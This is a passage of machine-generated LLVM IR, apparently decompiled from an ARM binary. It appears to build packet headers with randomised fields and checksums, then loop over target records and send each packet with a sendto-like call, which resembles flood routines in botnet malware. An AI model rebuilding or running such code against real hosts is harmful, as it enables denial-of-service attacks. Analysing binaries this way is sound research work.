  store i32 %v1_ca94, i32* %r1.global-to-local, align 4
  %v1_ca98 = add i32 %v0_ca94, 33
  %v2_ca98 = inttoptr i32 %v1_ca98 to i8*
  %v3_ca98 = load i8, i8* %v2_ca98, align 1
  %v4_ca98 = zext i8 %v3_ca98 to i32
  store i32 %v1_c980, i32* %r2.global-to-local, align 4
  %v1_caa0 = and i32 %v4_ca98, 223
  %v5_caa4 = or i32 %v1_caa0, %v4_caa4
  store i32 %v5_caa4, i32* %r3.global-to-local, align 4
  %v1_caa8 = trunc i32 %v5_caa4 to i8
  store i8 %v1_caa8, i8* %v2_ca98, align 1
  %v0_caac = load i32, i32* %r1.global-to-local, align 4
  %v1_caac = add i32 %v0_caac, 13
  %v2_caac = inttoptr i32 %v1_caac to i8*
  %v3_caac = load i8, i8* %v2_caac, align 1
  %v4_caac = zext i8 %v3_caac to i32
  store i32 %v1_c988, i32* %r3.global-to-local, align 4
  %v1_cab4 = and i32 %v4_caac, 239
  %v5_cab8 = or i32 %v1_cab4, %v4_cab8
  store i32 %v5_cab8, i32* %r2.global-to-local, align 4
  %v1_cabc = trunc i32 %v5_cab8 to i8
  store i8 %v1_cabc, i8* %v2_caac, align 1
  %v0_cac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_cac0 = add i32 %v0_cac0, 13
  %v2_cac0 = inttoptr i32 %v1_cac0 to i8*
  %v3_cac0 = load i8, i8* %v2_cac0, align 1
  %v4_cac0 = zext i8 %v3_cac0 to i32
  store i32 %v1_c9a8, i32* %ip.global-to-local, align 4
  %v1_cac8 = and i32 %v4_cac0, 247
  %v5_cacc = or i32 %v1_cac8, %v4_cacc
  store i32 %v5_cacc, i32* %r3.global-to-local, align 4
  %v1_cad0 = trunc i32 %v5_cacc to i8
  store i8 %v1_cad0, i8* %v2_cac0, align 1
  %v0_cad4 = load i32, i32* %r1.global-to-local, align 4
  %v1_cad4 = add i32 %v0_cad4, 13
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v4_cad4 = zext i8 %v3_cad4 to i32
  store i32 %v1_c9ac, i32* %r0.global-to-local, align 4
  %v1_cadc = and i32 %v4_cad4, 251
  %v5_cae0 = or i32 %v1_cadc, %v4_cae0
  store i32 %v5_cae0, i32* %r2.global-to-local, align 4
  %v1_cae4 = trunc i32 %v5_cae0 to i8
  store i8 %v1_cae4, i8* %v2_cad4, align 1
  %v0_cae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_cae8 = add i32 %v0_cae8, 13
  %v2_cae8 = inttoptr i32 %v1_cae8 to i8*
  %v3_cae8 = load i8, i8* %v2_cae8, align 1
  %v4_cae8 = zext i8 %v3_cae8 to i32
  store i32 %v1_c9b0, i32* %r2.global-to-local, align 4
  %v1_caf0 = and i32 %v4_cae8, 253
  %v4_caf4 = or i32 %v1_caf0, %v3_caf4
  store i32 %v4_caf4, i32* %r3.global-to-local, align 4
  %v1_caf8 = trunc i32 %v4_caf4 to i8
  store i8 %v1_caf8, i8* %v2_cae8, align 1
  %v0_cafc = load i32, i32* %r1.global-to-local, align 4
  %v1_cafc = add i32 %v0_cafc, 12
  %v2_cafc = inttoptr i32 %v1_cafc to i8*
  %v3_cafc = load i8, i8* %v2_cafc, align 1
  %v4_cafc = zext i8 %v3_cafc to i32
  store i32 %v4_cafc, i32* %r2.global-to-local, align 4
  %v1_cb00 = add i32 %v0_cafc, 13
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v4_cb00 = zext i8 %v3_cb00 to i32
  %tmp84 = urem i8 %v3_cafc, 16
  %v1_cb08 = zext i8 %tmp84 to i32
  %v1_cb0c = and i32 %v4_cb00, 254
  %v2_cb10 = or i32 %v1_cb0c, %v1_c9c0
  %v1_cb14 = or i32 %v1_cb08, 160
  store i32 %v1_cb14, i32* %r2.global-to-local, align 4
  %v1_cb18 = trunc i32 %v2_cb10 to i8
  store i8 %v1_cb18, i8* %v2_cb00, align 1
  %v0_cb1c = load i32, i32* %r2.global-to-local, align 4
  %v1_cb1c = trunc i32 %v0_cb1c to i8
  %v2_cb1c = load i32, i32* %r1.global-to-local, align 4
  %v3_cb1c = add i32 %v2_cb1c, 12
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 %v1_cb1c, i8* %v4_cb1c, align 1
  store i32 %v3_cb24, i32* %r0.global-to-local, align 4
  store i32 %v7_cb24, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v2_cb30 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb30 = add i32 %v2_cb30, 3
  %v4_cb30 = inttoptr i32 %v3_cb30 to i8*
  store i8 %v5_c9e0, i8* %v4_cb30, align 1
  %v0_cb34 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb34 = trunc i32 %v0_cb34 to i8
  %v2_cb34 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb34 = add i32 %v2_cb34, 1
  %v4_cb34 = inttoptr i32 %v3_cb34 to i8*
  store i8 %v1_cb34, i8* %v4_cb34, align 1
  %v0_cb38 = load i32, i32* @r6, align 4
  %v1_cb38 = trunc i32 %v0_cb38 to i8
  %v2_cb38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cb38 = add i32 %v2_cb38, 2
  %v4_cb38 = inttoptr i32 %v3_cb38 to i8*
  store i8 %v1_cb38, i8* %v4_cb38, align 1
  %v0_cb3c = load i32, i32* @r5, align 4
  %v1_cb3c = load i32, i32* %r1.global-to-local, align 4
  %v2_cb3c = add i32 %v1_cb3c, 4
  %v3_cb3c = inttoptr i32 %v2_cb3c to i32*
  store i32 %v0_cb3c, i32* %v3_cb3c, align 4
  %v0_cb40 = load i32, i32* %ip.global-to-local, align 4
  %v1_cb40 = trunc i32 %v0_cb40 to i8
  %v2_cb40 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb40 = add i32 %v2_cb40, 41
  %v4_cb40 = inttoptr i32 %v3_cb40 to i8*
  store i8 %v1_cb40, i8* %v4_cb40, align 1
  %v0_cb44 = load i32, i32* %r3.global-to-local, align 4
  %v1_cb44 = trunc i32 %v0_cb44 to i8
  %v2_cb44 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb44 = add i32 %v2_cb44, 40
  %v4_cb44 = inttoptr i32 %v3_cb44 to i8*
  store i8 %v1_cb44, i8* %v4_cb44, align 1
  %v0_cb48 = call i32 @function_fe24()
  %v1_cb4c = mul i32 %v0_cb48, 256
  %v1_cb50 = and i32 %v1_cb4c, 3840
  %v1_cb54 = or i32 %v1_cb50, 28672
  %v3_cb5c = add nuw nsw i32 %v1_cb54, 2048
  %v3_cb687 = udiv i32 %v3_cb5c, 256
  store i32 %v3_cb687, i32* %r1.global-to-local, align 4
  %v0_cb6c = load i32, i32* %r4.global-to-local, align 4
  %v1_cb6c = add i32 %v0_cb6c, 42
  store i32 %v1_cb6c, i32* %r2.global-to-local, align 4
  %v4_cb70 = inttoptr i32 %v1_cb6c to i8*
  store i8 5, i8* %v4_cb70, align 1
  %v0_cb74 = load i32, i32* %r1.global-to-local, align 4
  %v1_cb74 = trunc i32 %v0_cb74 to i8
  %v2_cb74 = load i32, i32* %r2.global-to-local, align 4
  %v3_cb74 = add i32 %v2_cb74, 1
  %v4_cb74 = inttoptr i32 %v3_cb74 to i8*
  store i8 %v1_cb74, i8* %v4_cb74, align 1
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_cb80 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb80 = add i32 %v2_cb80, 47
  %v4_cb80 = inttoptr i32 %v3_cb80 to i8*
  store i8 10, i8* %v4_cb80, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_cb8c = load i32, i32* %r3.global-to-local, align 4
  %v1_cb8c = trunc i32 %v0_cb8c to i8
  %v2_cb8c = load i32, i32* %r4.global-to-local, align 4
  %v3_cb8c = add i32 %v2_cb8c, 46
  %v4_cb8c = inttoptr i32 %v3_cb8c to i8*
  store i8 %v1_cb8c, i8* %v4_cb8c, align 1
  %v0_cb90 = load i32, i32* %r2.global-to-local, align 4
  %v1_cb90 = trunc i32 %v0_cb90 to i8
  %v2_cb90 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb90 = add i32 %v2_cb90, 45
  %v4_cb90 = inttoptr i32 %v3_cb90 to i8*
  store i8 %v1_cb90, i8* %v4_cb90, align 1
  %v0_cb94 = load i32, i32* %r0.global-to-local, align 4
  %v1_cb94 = trunc i32 %v0_cb94 to i8
  %v2_cb94 = load i32, i32* %r4.global-to-local, align 4
  %v3_cb94 = add i32 %v2_cb94, 44
  %v4_cb94 = inttoptr i32 %v3_cb94 to i8*
  store i8 %v1_cb94, i8* %v4_cb94, align 1
  %v0_cb98 = call i32 @function_fe24()
  store i32 %v0_cb98, i32* %r0.global-to-local, align 4
  %v2_cba0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cba0 = add i32 %v2_cba0, 56
  %v4_cba0 = inttoptr i32 %v3_cba0 to i8*
  store i8 1, i8* %v4_cba0, align 1
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_cbb0 = load i32, i32* %r4.global-to-local, align 4
  %v2_cbb0 = add i32 %v1_cbb0, 48
  %v3_cbb0 = inttoptr i32 %v2_cbb0 to i32*
  store i32 %v0_cb98, i32* %v3_cbb0, align 4
  %v0_cbb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbb4 = trunc i32 %v0_cbb4 to i8
  %v2_cbb4 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb4 = add i32 %v2_cbb4, 58
  %v4_cbb4 = inttoptr i32 %v3_cbb4 to i8*
  store i8 %v1_cbb4, i8* %v4_cbb4, align 1
  %v0_cbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_cbb8 = trunc i32 %v0_cbb8 to i8
  %v2_cbb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbb8 = add i32 %v2_cbb8, 59
  %v4_cbb8 = inttoptr i32 %v3_cbb8 to i8*
  store i8 %v1_cbb8, i8* %v4_cbb8, align 1
  %v0_cbbc = load i32, i32* %ip.global-to-local, align 4
  %v1_cbbc = load i32, i32* %r4.global-to-local, align 4
  %v2_cbbc = add i32 %v1_cbbc, 52
  %v3_cbbc = inttoptr i32 %v2_cbbc to i32*
  store i32 %v0_cbbc, i32* %v3_cbbc, align 4
  %v0_cbc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_cbc0 = trunc i32 %v0_cbc0 to i8
  %v2_cbc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_cbc0 = add i32 %v2_cbc0, 57
  %v4_cbc0 = inttoptr i32 %v3_cbc0 to i8*
  store i8 %v1_cbc0, i8* %v4_cbc0, align 1
  %v3_cbc4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_cbc4, i32* %r3.global-to-local, align 4
  %v1_cbc8 = add i32 %v3_cbc4, 1
  store i32 %v1_cbc8, i32* @r4, align 4
  %v0_cbcc = load i32, i32* @sl, align 4
  %v9_cbcc = icmp eq i32 %v0_cbcc, %v1_cbc8
  store i1 %v9_cbcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cbc8, i32* %stack_var_-40, align 4
  %v8_cbd4 = icmp sgt i32 %v0_cbcc, %v1_cbc8
  br i1 %v8_cbd4, label %dec_label_pc_c9e8, label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %bb76, %dec_label_pc_c8fc
  %v0_cbd8 = phi i32 [ %v0_c928, %dec_label_pc_c8fc ], [ %v0_cbcc, %bb76 ]
  %v2_cbd8 = icmp eq i32 %v0_cbd8, 0
  store i1 %v2_cbd8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_cd90 = icmp eq i32 %v3_c918, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  %v2_ce0c = icmp eq i32 %v1_c924, 0
  %v2_cc14 = icmp eq i32 %v6_c8b0, -1
  %v7_cc14 = icmp eq i32 %v6_c8b0, -1
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cbe0.outer:                          ; preds = %dec_label_pc_cd0c, %dec_label_pc_cbd8
  %v1_cbe0.ph.in = phi i32 [ %v0_cd00, %dec_label_pc_cd0c ], [ %v0_cbd8, %dec_label_pc_cbd8 ]
  %v0_cbe0.ph = phi i1 [ %v2_cd0c, %dec_label_pc_cd0c ], [ %v2_cbd8, %dec_label_pc_cbd8 ]
  %v1_cbe0.ph = icmp slt i32 %v1_cbe0.ph.in, 0
  %v4_cbe0 = or i1 %v1_cbe0.ph, %v0_cbe0.ph
  br label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %dec_label_pc_cbe0.outer, %dec_label_pc_cbe0
  br i1 %v4_cbe0, label %dec_label_pc_cbe0, label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %dec_label_pc_cbe0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cc6c, %dec_label_pc_cbe4
  %v1_cc00 = phi i32 [ %v1_ccfc, %dec_label_pc_cc6c ], [ 0, %dec_label_pc_cbe4 ]
  %v5_cbf4 = mul i32 %v1_cc00, 24
  %v1_cbf8 = load i32, i32* @r8, align 4
  %v2_cbf8 = add i32 %v1_cbf8, %v5_cbf4
  store i32 %v2_cbf8, i32* %r3.global-to-local, align 4
  %v1_cbfc = add i32 %v2_cbf8, 20
  %v2_cbfc = inttoptr i32 %v1_cbfc to i8*
  %v3_cbfc = load i8, i8* %v2_cbfc, align 1
  %v4_cbfc = zext i8 %v3_cbfc to i32
  store i32 %v4_cbfc, i32* %r2.global-to-local, align 4
  %v0_cc00 = load i32, i32* %fp.global-to-local, align 4
  %v4_cc00 = mul i32 %v1_cc00, 4
  %v5_cc00 = add i32 %v0_cc00, %v4_cc00
  %v6_cc00 = inttoptr i32 %v5_cc00 to i32*
  %v7_cc00 = load i32, i32* %v6_cc00, align 4
  store i32 %v7_cc00, i32* @r5, align 4
  %v7_cc04 = icmp eq i8 %v3_cbfc, 31
  store i1 %v7_cc04, i1* %cpsr_z.global-to-local, align 1
  %v1_cc08 = add i32 %v7_cc00, 20
  store i32 %v1_cc08, i32* @r6, align 4
  %tmp85 = icmp ult i8 %v3_cbfc, 32
  br i1 %tmp85, label %dec_label_pc_cd18, label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbf0
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_cd90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge, %dec_label_pc_cc1c
  %v1_cc34 = phi i32 [ %v1_cc34.pre, %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_cc1c ]
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v9_cc34 = icmp eq i32 %v3_c91c, %v1_cc34
  store i1 %v9_cc34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc34, label %dec_label_pc_cdb8, label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge, %dec_label_pc_cc30
  %v1_cc40 = phi i32 [ %v1_cc40.pre, %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge ], [ %v1_cc34, %dec_label_pc_cc30 ]
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
  %v9_cc40 = icmp eq i32 %v3_c920, %v1_cc40
  store i1 %v9_cc40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc40, label %dec_label_pc_cdd4, label %dec_label_pc_cc48

dec_label_pc_cc48:                                ; preds = %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge, %dec_label_pc_cc3c
  %v1_cc4c = phi i32 [ %v1_cc4c.pre, %dec_label_pc_cdb8.dec_label_pc_cc48_crit_edge ], [ %v1_cc40, %dec_label_pc_cc3c ]
  store i32 %v5_c7ec, i32* %r0.global-to-local, align 4
  %v9_cc4c = icmp eq i32 %v5_c7ec, %v1_cc4c
  store i1 %v9_cc4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc4c, label %dec_label_pc_cdf0, label %dec_label_pc_cc54

dec_label_pc_cc54:                                ; preds = %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge, %dec_label_pc_cc48
  %v1_cc58 = phi i32 [ %v1_cc58.pre, %dec_label_pc_cdd4.dec_label_pc_cc54_crit_edge ], [ %v1_cc4c, %dec_label_pc_cc48 ]
  store i32 %v6_c804, i32* %r2.global-to-local, align 4
  %v9_cc58 = icmp eq i32 %v6_c804, %v1_cc58
  store i1 %v9_cc58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cc58, label %dec_label_pc_ce04, label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cdf0, %dec_label_pc_cc54
  store i32 %v1_c924, i32* %r3.global-to-local, align 4
  store i1 %v2_ce0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ce0c, label %dec_label_pc_cc6c, label %dec_label_pc_ce18

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_ce04, %dec_label_pc_ce18
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cc70 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc70 = trunc i32 %v0_cc70 to i8
  %v2_cc70 = load i32, i32* @r5, align 4
  %v3_cc70 = add i32 %v2_cc70, 10
  %v4_cc70 = inttoptr i32 %v3_cc70 to i8*
  store i8 %v1_cc70, i8* %v4_cc70, align 1
  %v0_cc74 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc74 = trunc i32 %v0_cc74 to i8
  %v2_cc74 = load i32, i32* @r5, align 4
  %v3_cc74 = add i32 %v2_cc74, 11
  %v4_cc74 = inttoptr i32 %v3_cc74 to i8*
  store i8 %v1_cc74, i8* %v4_cc74, align 1
  %v0_cc78 = load i32, i32* @r5, align 4
  store i32 %v0_cc78, i32* @r0, align 4
  %v2_cc7c = call i32 @function_e424(i32 %v0_cc78, i32 20)
  %v3_cc7c = trunc i32 %v2_cc7c to i8
  %v4_cc8027 = udiv i32 %v2_cc7c, 256
  %v1_cc84 = trunc i32 %v4_cc8027 to i8
  %v2_cc84 = load i32, i32* @r5, align 4
  %v3_cc84 = add i32 %v2_cc84, 11
  %v4_cc84 = inttoptr i32 %v3_cc84 to i8*
  store i8 %v1_cc84, i8* %v4_cc84, align 1
  %v3_cc88 = load i32, i32* @r5, align 4
  %v4_cc88 = add i32 %v3_cc88, 10
  %v5_cc88 = inttoptr i32 %v4_cc88 to i8*
  store i8 %v3_cc7c, i8* %v5_cc88, align 1
  %v0_cc8c = load i32, i32* @r6, align 4
  store i32 %v0_cc8c, i32* @r1, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_cc98 = load i32, i32* %r7.global-to-local, align 4
  %v1_cc98 = trunc i32 %v0_cc98 to i8
  %v3_cc98 = add i32 %v0_cc8c, 16
  %v4_cc98 = inttoptr i32 %v3_cc98 to i8*
  store i8 %v1_cc98, i8* %v4_cc98, align 1
  %v0_cc9c = load i32, i32* %r7.global-to-local, align 4
  %v1_cc9c = trunc i32 %v0_cc9c to i8
  %v2_cc9c = load i32, i32* @r6, align 4
  %v3_cc9c = add i32 %v2_cc9c, 17
  %v4_cc9c = inttoptr i32 %v3_cc9c to i8*
  store i8 %v1_cc9c, i8* %v4_cc9c, align 1
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v0_cca0, i32* %r0.global-to-local, align 4
  %v4_cca4 = call i32 @function_e480(i32 %v0_cca0, i32 %v0_cc8c, i32 10240, i32 40)
  %v5_cca4 = trunc i32 %v4_cca4 to i8
  store i32 %v4_cca4, i32* %r0.global-to-local, align 4
  %v4_cca828 = udiv i32 %v4_cca4, 256
  %v1_ccac = trunc i32 %v4_cca828 to i8
  %v2_ccac = load i32, i32* @r6, align 4
  %v3_ccac = add i32 %v2_ccac, 17
  %v4_ccac = inttoptr i32 %v3_ccac to i8*
  store i8 %v1_ccac, i8* %v4_ccac, align 1
  %v3_ccb0 = load i32, i32* @r6, align 4
  %v4_ccb0 = add i32 %v3_ccb0, 16
  %v5_ccb0 = inttoptr i32 %v4_ccb0 to i8*
  store i8 %v5_cca4, i8* %v5_ccb0, align 1
  %v3_ccb4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccb4, i32* %r3.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r5, align 4
  %v1_ccb8 = add i32 %v0_ccb8, 20
  %v2_ccb8 = inttoptr i32 %v1_ccb8 to i32*
  %v3_ccb8 = load i32, i32* %v2_ccb8, align 4
  %v3_ccc0 = udiv i32 %v3_ccb8, 65536
  store i32 %v3_ccc0, i32* %r2.global-to-local, align 4
  %v5_ccc4 = mul i32 %v3_ccb4, 24
  %v1_ccc8 = load i32, i32* @r8, align 4
  %v2_ccc8 = add i32 %v1_ccc8, %v5_ccc4
  store i32 %v2_ccc8, i32* %ip.global-to-local, align 4
  %v3_cccc26 = udiv i32 %v3_ccb8, 16777216
  %v1_ccd0 = trunc i32 %v3_cccc26 to i8
  %v3_ccd0 = add i32 %v2_ccc8, 3
  %v4_ccd0 = inttoptr i32 %v3_ccd0 to i8*
  store i8 %v1_ccd0, i8* %v4_ccd0, align 1
  %v0_ccd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ccd4 = trunc i32 %v0_ccd4 to i8
  %v2_ccd4 = load i32, i32* %ip.global-to-local, align 4
  %v3_ccd4 = add i32 %v2_ccd4, 2
  %v4_ccd4 = inttoptr i32 %v3_ccd4 to i8*
  store i8 %v1_ccd4, i8* %v4_ccd4, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r1.global-to-local, align 4
  %v0_cce0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_cce0, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_ccec = load i32, i32* %ip.global-to-local, align 4
  %v6_ccf4 = inttoptr i32 %v0_ccdc to i32*
  %v7_ccf4 = call i32 @function_1372c(i32 %v0_cce0, i32* %v6_ccf4, i32 60, i32 16384, i32 %v0_ccec, i32 16)
  %v3_ccf8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ccf8, i32* %r3.global-to-local, align 4
  %v1_ccfc = add i32 %v3_ccf8, 1
  store i32 %v1_ccfc, i32* %r0.global-to-local, align 4
  %v0_cd00 = load i32, i32* @sl, align 4
  %v9_cd00 = icmp eq i32 %v0_cd00, %v1_ccfc
  store i1 %v9_cd00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ccfc, i32* %stack_var_-40, align 4
  %v8_cd08 = icmp sgt i32 %v0_cd00, %v1_ccfc
  br i1 %v8_cd08, label %dec_label_pc_cbf0, label %dec_label_pc_cd0c

dec_label_pc_cd0c:                                ; preds = %dec_label_pc_cc6c
  %v2_cd0c = icmp eq i32 %v0_cd00, 0
  store i1 %v2_cd0c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cbe0.outer

dec_label_pc_cd18:                                ; preds = %dec_label_pc_cbf0
  %v1_cd18 = add i32 %v2_cbf8, 16
  %v2_cd18 = inttoptr i32 %v1_cd18 to i32*
  %v3_cd18 = load i32, i32* %v2_cd18, align 4
  store i32 %v3_cd18, i32* %r4.global-to-local, align 4
  %v0_cd1c = call i32 @function_fe24()
  store i32 %v0_cd1c, i32* %r0.global-to-local, align 4
  %v3_cd20 = load i32, i32* %stack_var_-40, align 4
  %v5_cd28 = mul i32 %v3_cd20, 24
  %v0_cd2c = load i32, i32* %r4.global-to-local, align 4
  %v1_cd30 = load i32, i32* @r8, align 4
  %v2_cd30 = add i32 %v1_cd30, %v5_cd28
  store i32 %v2_cd30, i32* %r1.global-to-local, align 4
  %v1_cd34 = and i32 %v0_cd2c, 65280
  store i32 %v1_cd34, i32* %r3.global-to-local, align 4
  %v1_cd2c = udiv i32 %v0_cd2c, 256
  %v3_cd38 = and i32 %v1_cd2c, 65280
  store i32 %v3_cd38, i32* %r2.global-to-local, align 4
  %v3_cd3c = mul i32 %v0_cd2c, 16777216
  store i32 %v3_cd3c, i32* %ip.global-to-local, align 4
  %v1_cd40 = add i32 %v2_cd30, 20
  %v2_cd40 = inttoptr i32 %v1_cd40 to i8*
  %v3_cd40 = load i8, i8* %v2_cd40, align 1
  %v4_cd40 = zext i8 %v3_cd40 to i32
  %v4_cd44 = mul nuw nsw i32 %v1_cd34, 256
  %v5_cd44 = or i32 %v4_cd44, %v3_cd3c
  store i32 %v5_cd44, i32* %ip.global-to-local, align 4
  %v2_cd4c = call i32 @llvm.bswap.i32(i32 %v0_cd2c)
  %v7_cd50 = lshr i32 %v0_cd1c, %v4_cd40
  %v8_cd50 = add i32 %v7_cd50, %v2_cd4c
  store i32 %v8_cd50, i32* %r2.global-to-local, align 4
  %v3_cd5c = mul i32 %v8_cd50, 16777216
  %v1_cd54 = mul i32 %v8_cd50, 256
  %v4_cd60 = and i32 %v1_cd54, 16711680
  %v5_cd60 = or i32 %v4_cd60, %v3_cd5c
  store i32 %v5_cd60, i32* %r1.global-to-local, align 4
  store i32 %v6_c8b0, i32* %r0.global-to-local, align 4
  %v2_cd70 = call i32 @llvm.bswap.i32(i32 %v8_cd50)
  store i32 %v2_cd70, i32* %r3.global-to-local, align 4
  store i1 %v7_cc14, i1* %cpsr_z.global-to-local, align 1
  %v1_cd78 = load i32, i32* @r5, align 4
  %v2_cd78 = add i32 %v1_cd78, 16
  %v3_cd78 = inttoptr i32 %v2_cd78 to i32*
  store i32 %v2_cd70, i32* %v3_cd78, align 4
  br i1 %v2_cc14, label %dec_label_pc_cd80, label %dec_label_pc_cc1c

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd18, %dec_label_pc_cc10
  %v0_cd80 = call i32 @function_fe24()
  store i32 %v0_cd80, i32* %r0.global-to-local, align 4
  store i32 %v3_c918, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_cd90, i1* %cpsr_z.global-to-local, align 1
  %v1_cd94 = load i32, i32* @r5, align 4
  %v2_cd94 = add i32 %v1_cd94, 12
  %v3_cd94 = inttoptr i32 %v2_cd94 to i32*
  store i32 %v0_cd80, i32* %v3_cd94, align 4
  br i1 %v9_cd90, label %dec_label_pc_cd9c, label %dec_label_pc_cd80.dec_label_pc_cc30_crit_edge

dec_label_pc_cd80.dec_label_pc_cc30_crit_edge:    ; preds = %dec_label_pc_cd80
  %v1_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cd9c:                                ; preds = %dec_label_pc_cd80, %dec_label_pc_cc1c
  %v0_cd9c = call i32 @function_fe24()
  %v1_cd9c = trunc i32 %v0_cd9c to i8
  store i32 %v0_cd9c, i32* %r0.global-to-local, align 4
  %v4_cda029 = udiv i32 %v0_cd9c, 256
  %v1_cda4 = trunc i32 %v4_cda029 to i8
  %v2_cda4 = load i32, i32* @r5, align 4
  %v3_cda4 = add i32 %v2_cda4, 5
  %v4_cda4 = inttoptr i32 %v3_cda4 to i8*
  store i8 %v1_cda4, i8* %v4_cda4, align 1
  store i32 %v3_c91c, i32* %r3.global-to-local, align 4
  %v1_cdac = load i32, i32* @r4, align 4
  %v9_cdac = icmp eq i32 %v3_c91c, %v1_cdac
  store i1 %v9_cdac, i1* %cpsr_z.global-to-local, align 1
  %v3_cdb0 = load i32, i32* @r5, align 4
  %v4_cdb0 = add i32 %v3_cdb0, 4
  %v5_cdb0 = inttoptr i32 %v4_cdb0 to i8*
  store i8 %v1_cd9c, i8* %v5_cdb0, align 1
  %v0_cdb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_cdb4, label %dec_label_pc_cdb8, label %dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge

dec_label_pc_cd9c.dec_label_pc_cc3c_crit_edge:    ; preds = %dec_label_pc_cd9c
  %v1_cc40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc3c

dec_label_pc_cdb8:                                ; preds = %dec_label_pc_cd9c, %dec_label_pc_cc30
  %v0_cdb8 = call i32 @function_fe24()
  %v1_cdb8 = trunc i32 %v0_cdb8 to i8
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  store i32 %v3_c920, i32* %ip.global-to-local, align 4
